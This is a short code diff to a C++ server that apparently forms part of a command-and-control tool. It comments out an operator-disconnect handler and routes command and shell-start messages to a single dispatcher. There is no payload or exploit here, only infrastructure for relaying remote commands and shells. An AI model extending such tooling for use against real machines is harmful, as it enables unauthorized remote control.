@@ -88,13 +88,13 @@ void server::bind_failed(int server_fd){
 
 // handles operator data during sending
 // if operator disconnects normally or due to connection errors this function is executed
-void server::operator_data_recvHandling(int received_bytes, int client_fd){
-    if(received_bytes == 0)
-        std::cout << "[+] operator disconnected normally" << std::endl;
-    else if(received_bytes < 0)
-        std::cout << "[!] operator connection error" << std::endl;
-    close(client_fd);
-}
+// void server::operator_data_recvHandling(int received_bytes, int client_fd){
+//     if(received_bytes == 0)
+//         std::cout << "[+] operator disconnected normally" << std::endl;
+//     else if(received_bytes < 0)
+//         std::cout << "[!] operator connection error" << std::endl;
+//     close(client_fd);
+// }
 
 
 // acts as a python's send_all() approximate
@@ -460,11 +460,9 @@ void server::operator_listener(){
 
             // Starting Dispatch
             std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
-            if(received_packet.message_type == MESSAGE_COMMAND){
-                command_dispatcher(received_packet, client_fd); // automatically passes the address of the packet structure without having to deal with complex pointers and dereferencing
-            }
-            else if(received_packet.message_type == MESSAGE_SHELL_START){
-                command_dispatcher(received_packet, client_fd);
+            if(received_packet.message_type == MESSAGE_COMMAND ||
+                received_packet.message_type == MESSAGE_SHELL_START){
+                command_dispatcher(received_packet, client_fd);// automatically passes the address of the packet structure without having to deal with complex pointers and dereferencing
             }
             else{
                 std::cout << "[!]unsupported MESSAGE_TYPE : " << received_packet.message_type << std::endl;
